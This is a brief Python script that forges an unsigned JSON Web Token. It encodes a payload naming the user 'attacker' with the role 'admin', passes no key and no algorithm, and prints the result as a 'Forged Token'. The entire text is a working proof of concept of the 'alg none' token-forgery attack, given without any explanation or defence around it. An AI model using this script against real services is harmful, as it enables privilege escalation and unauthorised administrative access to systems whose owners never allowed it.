import jwt

payload = {
    "user": "attacker",
    "role": "admin"
}

token = jwt.encode(payload, key=None, algorithm=None)

print("\nForged Token:")
print(token)